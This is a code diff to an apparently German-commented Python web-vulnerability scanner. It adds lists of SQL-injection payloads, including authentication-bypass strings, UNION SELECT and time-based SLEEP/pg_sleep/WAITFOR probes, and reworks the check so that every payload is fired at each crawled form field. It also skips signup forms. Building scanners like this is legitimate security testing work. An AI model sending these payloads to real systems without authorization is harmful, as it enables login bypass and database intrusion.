@@ -58,6 +58,23 @@ SQL_ERRORS = [
     "operationalerror", "programmingerror", "psycopg2", "ora-0", "odbc",
     "mysql_fetch", "pg::syntaxerror", "sqlstate", "near \"", "no such column",
 ]
+# Gängige SQLi-Payloads (als Feldwert eingesetzt). Decken Auth-Bypass,
+# verschiedene Quote-/Kommentar-/Klammer-Stile und numerische Kontexte ab.
+SQLI_PAYLOADS = [
+    "'", "\"", "')", "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1 -- ",
+    "' OR 1=1#", "') OR ('1'='1' -- ", "') OR 1=1 -- ", "\" OR \"1\"=\"1",
+    "\" OR 1=1 -- ", "admin' -- ", "admin'#", "' OR 'x'='x' -- ",
+    "1 OR 1=1", "1' OR '1'='1", "' UNION SELECT NULL -- ",
+]
+# Zeit-basiert blind: {d} = Verzögerung in Sekunden. Pro DB-Engine.
+SQLI_TIME = [
+    ("' OR SLEEP({d}) -- ", "MySQL/MariaDB"),
+    ("'||pg_sleep({d})-- ", "PostgreSQL"),
+    ("';WAITFOR DELAY '0:0:{d}'-- ", "MSSQL"),
+    ("' OR 1=1 AND SLEEP({d}) -- ", "MySQL/MariaDB"),
+]
+# Erfolgreiche-Login-Redirects (Auth-Bypass-Signal).
+_REDIRECT_CODES = {301, 302, 303, 307, 308}
 # Stacktrace-/Debugger-Signaturen (Info-Leak).
 DEBUG_SIGS = [
     "traceback (most recent call last)", "werkzeug debugger", "<h1>internal server error</h1",
@@ -82,6 +99,8 @@ PROTECTED_GUESS = [
 ]
 # Felder, die als Anti-CSRF-Token durchgehen.
 CSRF_FIELD = re.compile(r"(csrf|xsrf|_token|authenticity|nonce)", re.I)
+# Felder, die ein Registrier-/Signup-Formular verraten (Passwort-Bestätigung).
+SIGNUP_FIELD = re.compile(r"(confirm|wiederhol|repeat|password2|pass2|bestaetig|bestätig)", re.I)
 # Sensible Pfade, die nicht ausgeliefert werden sollten.
 SENSITIVE_FILES = [
     "/.git/config", "/.git/HEAD", "/.env", "/config.py", "/settings.py", "/app.py",
@@ -134,6 +153,8 @@ class Scanner:
         self.origin = urlsplit(self.base)
         self.sess = session or requests.Session()
         self.anon_sess = None   # cookie-lose Session fuer den Access-Control-Check
+        self.skipped_signup = 0  # übersprungene Registrier-Formulare (keine aktive Füllung)
+        self.session_factory = requests.Session  # frische Sessions (z. B. SQLi-Auth-Bypass)
         self.timeout = timeout
         self.max_pages = max_pages
         self.max_targets = max_targets
@@ -151,14 +172,26 @@ class Scanner:
         kw.setdefault("timeout", self.timeout)
         return self.sess.get(url, **kw)
 
-    def send(self, t, value):
+    def send(self, t, value, allow_redirects=None):
         """Schickt einen Target-Request, wobei nur das Zielfeld auf `value` gesetzt wird."""
         data = dict(t.params)
         data[t.field] = value
-        kw = dict(timeout=self.timeout, allow_redirects=t.kind != "redirect")
+        ar = (t.kind != "redirect") if allow_redirects is None else allow_redirects
+        kw = dict(timeout=self.timeout, allow_redirects=ar)
         if t.method == "POST":
             return self.sess.post(t.url, data=data, **kw)
         return self.sess.get(t.url, params=data, **kw)
+
+    def send_fresh(self, t, value):
+        """Wie send(), aber mit einer frischen Session ohne Auth-Zustand und ohne
+        Redirect-Folgen — damit SQLi-Proben sich nicht gegenseitig einloggen."""
+        sess = self.session_factory()
+        data = dict(t.params)
+        data[t.field] = value
+        kw = dict(timeout=self.timeout, allow_redirects=False)
+        if t.method == "POST":
+            return sess.post(t.url, data=data, **kw)
+        return sess.get(t.url, params=data, **kw)
 
     # ---------------------------------------------------------- Crawl
     def crawl(self):
@@ -210,9 +243,16 @@ class Scanner:
             for form in forms:
                 action = urljoin(url, form["action"]) if form["action"] else url
                 baseline = {i["name"]: _benign(i) for i in form["inputs"]}
-                has_pw = any(i["type"] == "password" for i in form["inputs"])
-                if has_pw:
+                pw = [i for i in form["inputs"] if i["type"] == "password"]
+                # Signup erkennen: 2+ Passwortfelder oder ein "confirm/wiederholen"-Feld.
+                signup = len(pw) >= 2 or any(
+                    SIGNUP_FIELD.search(i["name"]) for i in form["inputs"])
+                if pw and not signup:
                     self.login_forms.append((action, form, baseline))
+                if signup:
+                    # Registrier-Formulare NICHT aktiv befüllen (würde Accounts anlegen).
+                    self.skipped_signup += 1
+                    continue
                 for i in form["inputs"]:
                     if i["type"] in ("submit", "button", "hidden", "file"):
                         continue  # hidden/Token-Felder nicht fuzzen, aber als baseline mitsenden
@@ -352,40 +392,96 @@ class Scanner:
                          f"{checked} Seite(n) anonym geprüft, alle verlangen Login")]
 
     def check_sqli(self):
+        """Testet jeden Eingabepunkt mit gängigen SQLi-Payloads — vollständig.
+
+        Bricht NICHT beim ersten Treffer ab: pro Eingabepunkt werden alle Payloads
+        und alle Techniken durchgespielt und JEDER Fund einzeln gemeldet. Techniken:
+        (1) SQL-Fehlermeldung, (2) Query bricht (500), (3) Auth-Bypass (Login-Redirect),
+        (4) boolean-Differential, (5) zeit-blind (SLEEP/pg_sleep/WAITFOR, je Engine).
+        Treffer werden pro Technik gebündelt (mit Beispiel-Payloads), damit mehrere
+        Funde sichtbar bleiben, ohne 17 identische Zeilen zu erzeugen.
+        """
         if not self.targets:
             return [_finding("SQL-Injection", NA, "keine Eingabepunkte gefunden")]
-        vulns = []
+        findings = []
         for t in self.targets:
-            base_val = t.params.get(t.field) or "1"
+            # Zufälliger, garantiert ungültiger Baseline-Wert (kein echter Login/Treffer).
+            probe = _tag()
             try:
-                baseline = self.send(t, base_val)
-                err = self.send(t, base_val + "'")
+                baseline = self.send_fresh(t, probe)
             except RequestException:
                 continue
-            body = (err.text or "").lower()
-            sql_err = any(s in body for s in SQL_ERRORS)
-            broke = err.status_code >= 500 and baseline.status_code < 500
-            if sql_err or broke:
-                why = "SQL-Fehlermeldung sichtbar" if sql_err else "einzelnes Quote löst 500 aus"
-                vulns.append(_finding("SQL-Injection", VULN,
-                                      f"{_loc(t)}: {why}", HIGH, _loc(t)))
-                continue
-            # Boolean-Differential (nur wenn error-based nichts ergab)
-            try:
-                t_true = self.send(t, base_val + "' OR '1'='1")
-                t_false = self.send(t, base_val + "' AND '1'='2")
-            except RequestException:
-                continue
-            lt, lf, lb = len(t_true.text), len(t_false.text), len(baseline.text)
-            # TRUE ähnelt Baseline (oder länger), FALSE deutlich kürzer -> boolean-based
-            if lb and lf < lb * 0.7 and lt >= lb * 0.9 and abs(lt - lf) > 50:
-                vulns.append(_finding("SQL-Injection", VULN,
-                                      f"{_loc(t)}: boolean-Differential (true={lt}B, false={lf}B)",
-                                      HIGH, _loc(t)))
-        if vulns:
-            return vulns
+            base_redirects = baseline.status_code in _REDIRECT_CODES
+            loc = _loc(t)
+
+            # Payload-Sweep: jeden Treffer seiner Technik zuordnen (kein break).
+            hits = {}   # Technik -> Liste getroffener Payloads
+            for p in SQLI_PAYLOADS:
+                try:
+                    r = self.send_fresh(t, p)
+                except RequestException:
+                    continue
+                body = (r.text or "").lower()
+                redir = r.headers.get("Location", "")
+                if any(s in body for s in SQL_ERRORS):
+                    hits.setdefault(("SQL-Fehlermeldung sichtbar", HIGH), []).append(p)
+                elif r.status_code >= 500 and baseline.status_code < 500:
+                    hits.setdefault(("Query bricht (HTTP 500)", HIGH), []).append(p)
+                elif (r.status_code in _REDIRECT_CODES and not base_redirects
+                      and "login" not in redir.lower()):
+                    hits.setdefault(("Auth-Bypass (Login-Redirect)", CRIT), []).append(p)
+            for (tech, sev), payloads in hits.items():
+                sample = ", ".join(repr(x) for x in payloads[:4])
+                more = f" (+{len(payloads) - 4} weitere)" if len(payloads) > 4 else ""
+                findings.append(_finding("SQL-Injection", VULN,
+                                         f"{loc}: {tech} — {len(payloads)} Payload(s): {sample}{more}",
+                                         sev, loc))
+
+            # Boolean + zeit-blind laufen unabhängig immer mit.
+            boolean = self._sqli_boolean(t, probe, len(baseline.text))
+            if boolean:
+                findings.append(_finding("SQL-Injection", VULN, f"{loc}: {boolean}", HIGH, loc))
+            for engine, dt in self._sqli_time(t, probe):
+                findings.append(_finding("SQL-Injection", VULN,
+                                         f"{loc}: zeit-blind ({engine}) — Antwort +{dt:.1f}s",
+                                         CRIT, loc))
+
+        if findings:
+            return findings
         return [_finding("SQL-Injection", SAFE,
-                         f"{len(self.targets)} Eingabepunkte, kein Injection-Verhalten")]
+                         f"{len(self.targets)} Eingabepunkte mit {len(SQLI_PAYLOADS)} Payloads "
+                         f"geprüft, kein Injection-Verhalten")]
+
+    def _sqli_boolean(self, t, base_val, lb):
+        try:
+            t_true = self.send_fresh(t, base_val + "' OR '1'='1")
+            t_false = self.send_fresh(t, base_val + "' AND '1'='2")
+        except RequestException:
+            return None
+        lt, lf = len(t_true.text), len(t_false.text)
+        if lb and lf < lb * 0.7 and lt >= lb * 0.9 and abs(lt - lf) > 50:
+            return f"boolean-Differential (true={lt}B, false={lf}B)"
+        return None
+
+    def _sqli_time(self, t, base_val, delay=4):
+        """Gibt ALLE Engines zurück, die eine messbare Verzögerung zeigen."""
+        found = []
+        try:
+            t0 = time.perf_counter()
+            self.send_fresh(t, base_val)
+            baseline = time.perf_counter() - t0
+        except RequestException:
+            return found
+        for tmpl, engine in SQLI_TIME:
+            try:
+                t0 = time.perf_counter()
+                self.send_fresh(t, base_val + tmpl.format(d=delay))
+                dt = time.perf_counter() - t0
+            except RequestException:
+                continue
+            if dt > baseline + delay * 0.8:
+                found.append((engine, dt))
+        return found
 
     def check_xss(self):
         if not self.targets:
@@ -615,7 +711,11 @@ def run(base, **kw):
     sc = Scanner(base, **kw)
     sc.crawl()
     print(f"[i] gecrawlt: {len(sc.pages)} Seite(n), {len(sc.targets)} Eingabepunkt(e), "
-          f"{len(sc.login_forms)} Login-Formular(e)\n")
+          f"{len(sc.login_forms)} Login-Formular(e)")
+    if sc.skipped_signup:
+        print(f"[i] {sc.skipped_signup} Registrier-Formular(e) NICHT aktiv befüllt "
+              f"(legt sonst Müll-Accounts an)")
+    print()
     findings = sc.run_all()
 
     order = {VULN: 0, INFO: 1, SAFE: 2, NA: 3}
